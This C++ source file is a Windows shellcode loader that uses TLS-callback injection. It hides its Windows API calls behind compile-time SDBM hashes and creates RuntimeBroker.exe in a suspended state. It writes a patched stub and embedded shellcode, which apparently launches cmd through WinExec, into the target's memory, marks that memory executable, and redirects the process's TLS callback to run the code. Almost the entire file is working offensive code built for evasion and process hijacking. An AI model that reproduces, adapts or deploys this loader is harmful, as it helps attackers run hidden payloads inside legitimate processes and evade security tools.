#include <string>
#include <iostream>
#include <cstdio>
#include <windows.h>
#include <winternl.h>

#define SEED 5

// Generate random seed at compile time
constexpr int RandomCompileTimeSeed(void) {
    return '0' * -40271 +
           __TIME__[7] * 1 +
           __TIME__[6] * 10 +
           __TIME__[4] * 60 +
           __TIME__[3] * 600 +
           __TIME__[1] * 3600 +
           __TIME__[0] * 36000;
};

// Constant expression
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// Hash string with SDBM
constexpr DWORD HashStringSdbm(const char* String) {
    ULONG hash = 0;
    INT c = 0;
    while ((c = *String++)) {
        // SDBM hash algo
        hash = c + (hash << 6) + (hash << 16) - hash;
    }
    return hash;
}

// Forward declarations of helper functions
PIMAGE_DOS_HEADER GetImageDosHeader(PBYTE pBase);
PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pBase, PIMAGE_DOS_HEADER pImgDosHdr);
PIMAGE_EXPORT_DIRECTORY GetImageExportDirectory(PBYTE pBase, IMAGE_OPTIONAL_HEADER ImgOptHdr);

// Custom GetProcAddress
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
    auto pBase = (PBYTE)hModule; // Get DLL base addr

    PIMAGE_DOS_HEADER pImageDosHeader = GetImageDosHeader(pBase);
    if (!pImageDosHeader) return NULL;

    PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pBase, pImageDosHeader);
    if (!pImageNtHeaders) return NULL;

    IMAGE_OPTIONAL_HEADER imageOptionalHeader = pImageNtHeaders->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = GetImageExportDirectory(pBase, imageOptionalHeader);
    if (!pImageExportDirectory) return NULL;

    auto FunctionNameArray = (PDWORD)(pBase + pImageExportDirectory->AddressOfNames);
    auto FunctionAddressArray = (PDWORD)(pBase + pImageExportDirectory->AddressOfFunctions);
    auto FunctionalOrdinalArray = (PWORD)(pBase + pImageExportDirectory->AddressOfNameOrdinals);

    // Loop through exported functions in DLL
    for (DWORD i = 0;

    i < pImageExportDirectory->NumberOfFunctions; i++) {
        // Get function name and address
        auto pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        auto pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionalOrdinalArray[i]]);

        // If hash matches, we got the right function
        if (dwApiNameHash == HashStringSdbm((const char*)pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

// Implementation of helper functions
PIMAGE_DOS_HEADER GetImageDosHeader(PBYTE pBase) {
    auto pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    return pImgDosHdr;
}

PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pBase, PIMAGE_DOS_HEADER pImgDosHdr) {
    auto pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return pImgNtHdrs;
}

PIMAGE_EXPORT_DIRECTORY GetImageExportDirectory(PBYTE pBase, IMAGE_OPTIONAL_HEADER ImgOptHdr) {
    return (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
}

// Hashed function type definitions
typedef PVOID(WINAPI* fnRtlSecureZeroMemory)(
    PVOID ptr,
    SIZE_T cnt
    );

typedef BOOL(WINAPI* fnCreateProcessW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef LPVOID(WINAPI* fnVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );

typedef BOOL(WINAPI* fnWriteProcessMemory)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
    );

typedef BOOL(WINAPI* fnVirtualProtectEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
    );

typedef BOOL(WINAPI* fnVirtualFreeEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType
    );

typedef HRSRC(WINAPI* fnFindResource)(
    HMODULE hModule,
    LPCSTR lpName,
    LPCSTR lpType
    );

typedef HGLOBAL(WINAPI* fnLoadResource)(
    HMODULE hModule,
    HRSRC hResInfo
    );

typedef DWORD(WINAPI* fnSizeofResource)(
    HMODULE hModule,
    HRSRC   hResInfo
    );

typedef LPVOID(WINAPI* fnLockResource)(
    HGLOBAL hResData
    );

// First shellcode - Based on: https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L67
unsigned char g_FixedShellcode[] = {
    0x51, 0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48,
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x48, 0xB9,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x0B,
    0x48, 0x83, 0xEC, 0x50, 0x48, 0x89, 0xD9, 0x48, 0xC7, 0xC2, 0x00,
    0x04, 0x00, 0x00, 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x4C, 0x8D,
    0x4C, 0x24, 0x20, 0x48, 0xB8, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
    0xBB, 0xBB, 0xFF, 0xD0, 0xE8, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x83,
    0xC4, 0x50, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41, 0x59, 0x5A,
    0x59, 0xC3
};

// Patch first shellcode with runtime values
BOOL PatchShellcode(IN HANDLE hProcess, IN ULONG_PTR uImgTlsCallback) {
    BOOL                result                  = false;
    ULONG_PTR           uImgTlsCallbackBytes    = NULL;
    ULONG_PTR           uVirtualProtect         = NULL;
    SIZE_T              sNumberOfBytesRead      = 0x00;
    unsigned long long  ullOriginalBytes        = 0x00;

    uImgTlsCallbackBytes = reinterpret_cast<ULONG_PTR>(LocalAlloc(LPTR, 0x10));
    if (!uImgTlsCallbackBytes) {
        goto _END_OF_FUNC;
    }

    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(uImgTlsCallback), reinterpret_cast<LPVOID>(uImgTlsCallbackBytes), 0x10, &sNumberOfBytesRead) || sNumberOfBytesRead != 0x10) {
        goto _END_OF_FUNC;
    }

    ullOriginalBytes = *reinterpret_cast<unsigned long long*>(uImgTlsCallbackBytes);

    // Copy uImgTlsCallback
    memcpy(&g_FixedShellcode[12], &uImgTlsCallback, sizeof(uImgTlsCallback));

    // Copy original bytes
    memcpy(&g_FixedShellcode[22], &ullOriginalBytes, sizeof(ullOriginalBytes));

    // Copy address of VirtualProtect
    uVirtualProtect = reinterpret_cast<ULONG_PTR>(VirtualProtect);
    memcpy(&g_FixedShellcode[60], &uVirtualProtect, sizeof(uVirtualProtect));

    result = true;

    _END_OF_FUNC:
    if (uImgTlsCallbackBytes) {
        LocalFree(reinterpret_cast<LPVOID>(uImgTlsCallbackBytes));
    }
    return result;
}

BOOL CreateProcessViaWinAPIsW(IN LPWSTR szProcessImgNameAndParms, IN OPTIONAL DWORD dwFlags, OUT PPROCESS_INFORMATION pProcessInfo) {
    if (!szProcessImgNameAndParms || !pProcessInfo)
        return FALSE;

    STARTUPINFOW		StartupInfo		    = { .cb = sizeof(STARTUPINFOW) };
    DWORD			    dwCreationFlags		= dwFlags;

    HMODULE hModuleKernel32 = LoadLibraryA("kernel32.dll");
    if (!hModuleKernel32) return FALSE;

    // Hash API function names at compile time
    constexpr auto CreateProcessW_SDBM = HashStringSdbm((const char*)"CreateProcessW");
    auto pCreateProcessW = (fnCreateProcessW)GetProcAddressH(hModuleKernel32, CreateProcessW_SDBM);

    RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

    if (!pCreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
        return FALSE;
    }
    return TRUE;
}

// Write the main shellcode in addition to the g_FixedShellcode shellcode
BOOL WritePayloadRemotely(HANDLE hProcess, PBYTE pShellcodeBuffer, SIZE_T sShellcodeSize, PBYTE* ppInjectionAddress) {
    DWORD dwOldProtection = 0;
    SIZE_T sNmbrOfBytesWritten = 0;

    HMODULE hModuleKernel32 = LoadLibraryA("kernel32.dll");
    if (!hModuleKernel32) return FALSE;

    // Hash API function names at compile time
    constexpr auto VirtualAllocEx_SDBM = HashStringSdbm((const char*)"VirtualAllocEx");
    auto pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressH(hModuleKernel32, VirtualAllocEx_SDBM);

    constexpr auto WriteProcessMemory_SDBM = HashStringSdbm((const char*)"WriteProcessMemory");
    auto pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hModuleKernel32, WriteProcessMemory_SDBM);

    constexpr auto VirtualFreeEx_SDBM = HashStringSdbm((const char*)"VirtualFreeEx");
    auto pVirtualFreeEx = (fnVirtualFreeEx)GetProcAddressH(hModuleKernel32, VirtualFreeEx_SDBM);

    constexpr auto VirtualProtectEx_SDBM = HashStringSdbm((const char*)"VirtualProtectEx");
    auto pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hModuleKernel32, VirtualProtectEx_SDBM);

    // Validate input parameters
    if (!hProcess || !pShellcodeBuffer || sShellcodeSize == 0 || !ppInjectionAddress) {
        return FALSE;
    }

    *ppInjectionAddress = static_cast<PBYTE>(pVirtualAllocEx(hProcess, nullptr, (sShellcodeSize + sizeof(g_FixedShellcode)), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!(*ppInjectionAddress)) {
        return FALSE;
    }

    // Write the g_FixedShellcode shellcode
    if (!pWriteProcessMemory(hProcess, *ppInjectionAddress, g_FixedShellcode, sizeof(g_FixedShellcode), &sNmbrOfBytesWritten) || sizeof(g_FixedShellcode) != sNmbrOfBytesWritten) {
        pVirtualFreeEx(hProcess, *ppInjectionAddress, 0, MEM_RELEASE); // Cleanup
        return FALSE;
    }

    sNmbrOfBytesWritten = 0;

    // Write the main shellcode
    if (!pWriteProcessMemory(hProcess, (*ppInjectionAddress + sizeof(g_FixedShellcode)), pShellcodeBuffer, sShellcodeSize, &sNmbrOfBytesWritten) || sShellcodeSize != sNmbrOfBytesWritten) {
        pVirtualFreeEx(hProcess, *ppInjectionAddress, 0, MEM_RELEASE); // Cleanup
        return FALSE;
    }

    if (!pVirtualProtectEx(hProcess, *ppInjectionAddress, (sShellcodeSize + sizeof(g_FixedShellcode)), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        pVirtualFreeEx(hProcess, *ppInjectionAddress, 0, MEM_RELEASE); // Cleanup
        return FALSE;
    }

    return TRUE;
}

BOOL ChangeRemoteTLSCallbackArray(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {
    if (!hProcess || !hThread) {
        return FALSE;
    }

    ULONG_PTR               uImageBase          = NULL,
                            uImageBaseBuffer    = NULL,
                            uInjectionAddress   = NULL;
    PIMAGE_NT_HEADERS       pImgNtHdrs          = NULL;
    PIMAGE_DATA_DIRECTORY   pEntryTLSDataDir    = NULL;
    PIMAGE_TLS_CALLBACK     pImgTlsCallback    = NULL;
    DWORD                   dwOldProtection     = 0x00;
    CONTEXT                 ThreadContext       = {.ContextFlags = CONTEXT_ALL};
    BOOL                    bResult             = FALSE;

    if (!GetThreadContext(hThread, &ThreadContext)) {
        return FALSE;
    }

    size_t reserved3Offset = offsetof(PEB, Reserved3);
    size_t elementSize = sizeof(PEB::Reserved3[0]);
    size_t specificElementOffset = reserved3Offset + elementSize;
    PVOID specificElementAddress = (char*)(ThreadContext.Rdx) + specificElementOffset;
    printf("[i] PPEB Address: 0x%p \n", (void*)ThreadContext.Rdx);
    printf("[i] Calculated Image Base Address To Be At: 0x%p \n", specificElementAddress);

    if (!ReadProcessMemory(hProcess, specificElementAddress, &uImageBase, sizeof(PVOID), NULL)) {
        printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        return FALSE;
    }

    printf("[i] Image Base Address: 0x%p \n", (void*)uImageBase);

    if (!(uImageBaseBuffer = (ULONG_PTR)LocalAlloc(LPTR, 0x1000))) {
        printf("[i] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if (!ReadProcessMemory(hProcess, (PVOID)uImageBase, (LPVOID)uImageBaseBuffer, 0x1000, NULL)) {
        printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[#] Press <ENTER> To Continue ... ");
    getchar();

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uImageBaseBuffer + ((PIMAGE_DOS_HEADER)uImageBaseBuffer)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        goto _END_OF_FUNC;
    }

    pEntryTLSDataDir = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!pEntryTLSDataDir->Size) {
        printf("[!] Remote Process Does Not Have Any TLS Callback Function\n");
        goto _END_OF_FUNC;
    }

    if (!ReadProcessMemory(hProcess, (LPCVOID)(uImageBase + pEntryTLSDataDir->VirtualAddress + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks)), &pImgTlsCallback, sizeof(PVOID), NULL)) {
        printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[*] pImgTlsCallback Should Be At: 0x%p \n", (void*)(uImageBase + pEntryTLSDataDir->VirtualAddress + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks)));
    printf("[*] pImgTlsCallback: 0x%p \n", pImgTlsCallback);
    printf("[#] Press <ENTER> To Continue ... ");
    getchar();

    printf("[i] Patching First Shellcode ... ");
    if (!PatchShellcode(hProcess, (ULONG_PTR)pImgTlsCallback)) {
        goto _END_OF_FUNC;
    }
    printf("[+] DONE \n");

    if (!WritePayloadRemotely(hProcess, pShellcodeBuffer, sShellcodeSize, (PBYTE*)&uInjectionAddress)) {
        goto _END_OF_FUNC;
    }

    printf("[*] Shellcode Injected At: 0x%p \n", (void*)uInjectionAddress);
    printf("[#] Press <ENTER> To Continue ... ");
    getchar();

    if (!VirtualProtectEx(hProcess, (LPVOID)pImgTlsCallback, 0x400, PAGE_READWRITE, &dwOldProtection)){
        printf("[!] VirtualProtectEx [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteProcessMemory(hProcess, (LPVOID)pImgTlsCallback, &uInjectionAddress, sizeof(PVOID), NULL)) {
        printf("[!] WriteProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[+] TLS Callback Changed To Point To: 0x%p \n", (void*)uInjectionAddress);

    bResult = TRUE;

    _END_OF_FUNC:
        LocalFree((PVOID)uImageBaseBuffer);
    return bResult;
}

unsigned char rawData[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0x48, 0xC7,
    0xC2, 0x05, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5C,
    0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

int main() {
    PROCESS_INFORMATION	ProcessInfo		= { 0x00 };
    WCHAR			szProcessName[]		= L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";

    // Create a suspended process
    if (!CreateProcessViaWinAPIsW(szProcessName, CREATE_SUSPENDED, &ProcessInfo)) {
        std::cout << "Failed to create process\n";
        return -1;
    }

    if (!ProcessInfo.hProcess || !ProcessInfo.hThread) {
        std::cout << "ProcessInfo is NULL\n";
        return -1;
    }

    if (!ChangeRemoteTLSCallbackArray(ProcessInfo.hProcess, ProcessInfo.hThread, rawData, sizeof(rawData))) {
        TerminateProcess(ProcessInfo.hProcess, 0);
        std::cout << "Failed to change TLS call back array\n";
        return -1;
    }

    // Resume the process
    ResumeThread(ProcessInfo.hThread);

    return 0;
}